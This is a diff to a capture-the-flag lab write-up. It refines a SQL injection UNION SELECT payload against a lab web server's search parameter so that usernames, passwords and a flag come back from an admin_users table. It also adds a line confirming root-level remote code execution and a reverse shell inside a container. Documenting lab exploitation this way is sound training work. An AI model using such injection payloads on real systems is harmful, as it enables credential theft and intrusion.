@@ -95,13 +95,15 @@ Error confirms injection. The `reports` table has 5 columns.
 **Step 3.2 — Dump `admin_users` table:**
 
 ```
-http://192.168.30.10/search?q=' UNION SELECT 1,username,password,flag,5 FROM admin_users--
+http://192.168.30.10/search?q=' UNION SELECT 1,username,flag,password,5 FROM admin_users--
 ```
 
-Result:
+Result (flag appears in the report body field):
 ```
+#1 — monitor
 FLAG{synapse_sqli_creds_dumped}
 ```
+> Note: the template renders columns as `id`, `title` (username), `body` (flag). The payload puts the flag in position 3 (body).
 
 **FLAG #1 captured: `FLAG{synapse_sqli_creds_dumped}`**
 
@@ -174,6 +176,8 @@ FLAG{synapse_nexus_exfil_complete}
 ```
 
 **FLAG #3 captured: `FLAG{synapse_nexus_exfil_complete}`**
+
+> **Verified:** RCE runs as `uid=0(root)` inside the Docker container. The reverse shell has full root access to the container filesystem.
 
 ---
 
